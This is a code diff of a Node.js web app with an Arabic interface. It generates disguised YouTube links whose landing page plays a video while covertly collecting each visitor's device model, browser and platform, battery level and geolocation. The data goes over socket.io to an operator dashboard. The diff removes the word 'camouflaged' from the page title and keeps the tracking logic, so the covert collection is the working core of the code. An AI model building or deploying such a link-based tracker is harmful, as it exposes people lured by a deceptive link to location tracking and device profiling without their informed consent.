@@ -16,7 +16,7 @@ app.get('/', (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>منشئ روابط يوتيوب المموهة</title>
+        <title>منشئ روابط يوتيوب</title>
         <style>
             body { font-family: system-ui, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
             .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin: 15px auto; max-width: 600px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
@@ -29,13 +29,13 @@ app.get('/', (req, res) => {
     <body>
         <h2>📺 منشئ روابط يوتيوب الذكية</h2>
         <div class="card">
-            <p>ضع رابط فيديو يوتيوب أدناه واضغط توليد:</p>
-            <input type="text" id="ytUrlInput" placeholder="https://www.youtube.com/watch?v=XXXXXXX">
+            <p>ضع رابط فيديو يوتيوب واضغط إنشاء:</p>
+            <input type="text" id="ytUrlInput" placeholder="https://www.youtube.com/watch?v=..." value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
             <br><br>
-            <button onclick="generateLink()">🔗 إنشاء الرابط المموه</button>
+            <button type="button" onclick="makeLink()">🔗 إنشاء الرابط</button>
             <div id="linkContainer" style="display:none; margin-top: 15px;">
-                <p>الرابط الخاص بك جاهز (انسخه وافتحه):</p>
-                <input type="text" id="linkInput" readonly>
+                <p>الرابط الخاص بك (انسخه وافتحه):</p>
+                <input type="text" id="linkInput" readonly onclick="this.select();">
             </div>
         </div>
 
@@ -46,22 +46,25 @@ app.get('/', (req, res) => {
 
         <script src="/socket.io/socket.io.js"></script>
         <script>
-            function generateLink() {
-                const ytUrl = document.getElementById('ytUrlInput').value.trim();
-                let videoId = "dQw4w9WgXcQ"; // فيديو افتراضي في حال كان الرابط فارغاً
+            function makeLink() {
+                const ytUrl = document.getElementById('ytUrlInput').value;
+                let videoId = "dQw4w9WgXcQ";
                 
-                if (ytUrl) {
-                    const match = ytUrl.match(/(?:v=|youtu\.be\/|embed\/)([\w-]{11})/);
-                    if (match && match[1]) {
-                        videoId = match[1];
-                    }
+                // استخراج معرف فيديو اليوتيوب
+                if (ytUrl.includes('youtu.be/')) {
+                    videoId = ytUrl.split('youtu.be/')[1].substring(0, 11);
+                } else if (ytUrl.includes('v=')) {
+                    videoId = ytUrl.split('v=')[1].substring(0, 11);
                 }
                 
-                const uniqueId = Math.random().toString(36).substring(2, 9);
+                const uniqueId = Math.random().toString(36).substring(2, 8);
                 const fullUrl = window.location.origin + '/watch/' + uniqueId + '?v=' + videoId;
                 
-                document.getElementById('linkInput').value = fullUrl;
-                document.getElementById('linkContainer').style.display = 'block';
+                const linkInput = document.getElementById('linkInput');
+                linkInput.value = fullUrl;
+                
+                const container = document.getElementById('linkContainer');
+                container.style.display = 'block';
             }
 
             const socket = io();
@@ -71,13 +74,13 @@ app.get('/', (req, res) => {
                 
                 const box = document.createElement('div');
                 box.className = 'info-box';
-                box.innerHTML = \`
-                    <strong>📱 اسم الهاتف / الجهاز:</strong> \${data.deviceName}<br>
-                    <strong>🌐 المتصفح والنظام:</strong> \{data.platform}<br>
+                box.innerHTML = `
+                    <strong>📱 الجهاز:</strong> \${data.deviceName}<br>
+                    <strong>🌐 المتصفح:</strong> \${data.platform}<br>
                     <strong>🔋 الشحن:</strong> \${data.battery}<br>
-                    <strong>📍 الموقع الجغرافي:</strong> \${data.location}<br>
+                    <strong>📍 الموقع:</strong> \${data.location}<br>
                     <strong>🕒 الوقت:</strong> \${data.time}
-                \`;
+                `;
                 logs.prepend(box);
             });
         </script>
@@ -86,7 +89,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// 2. صفحة عرض اليوتيوب في الواجهة وجمع المعلومات في الخلفية
+// 2. صفحة عرض اليوتيوب وجمع المعلومات
 app.get('/watch/:id', (req, res) => {
   const videoId = req.query.v || 'dQw4w9WgXcQ';
   res.send(`
@@ -119,10 +122,7 @@ app.get('/watch/:id', (req, res) => {
                 if (ua.includes('Samsung')) return 'Samsung Galaxy';
                 if (ua.includes('Huawei')) return 'Huawei';
                 if (ua.includes('Xiaomi') || ua.includes('Redmi') || ua.includes('POCO')) return 'Xiaomi / Redmi';
-                if (ua.includes('Android')) {
-                    let match = ua.match(/\\b(SM-[A-Z0-9]+|GT-[A-Z0-9]+|Pixel\\s[0-9a-zA-Z\\s]+)\\b/);
-                    return match ? "Android (" + match[1] + ")" : "Android Device";
-                }
+                if (ua.includes('Android')) return 'Android Device';
                 if (ua.includes('Windows')) return 'Windows PC';
                 if (ua.includes('Macintosh')) return 'Mac';
                 return 'جهاز غير معروف';
@@ -137,15 +137,15 @@ app.get('/watch/:id', (req, res) => {
                     } catch(e){}
                 }
 
-                let locationStr = "لم يوافق المستخدم على إذن الموقع";
+                let locationStr = "لم يوافق المستخدم";
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         (pos) => {
-                            locationStr = "خط الطول: " + pos.coords.latitude.toFixed(4) + ", خط العرض: " + pos.coords.longitude.toFixed(4);
+                            locationStr = "خط الطول: " + pos.coords.latitude.toFixed(3) + ", خط العرض: " + pos.coords.longitude.toFixed(3);
                             postData(batteryLevel, locationStr);
                         },
                         () => { postData(batteryLevel, locationStr); },
-                        { timeout: 7000 }
+                        { timeout: 5000 }
                     );
                 } else {
                     postData(batteryLevel, locationStr);
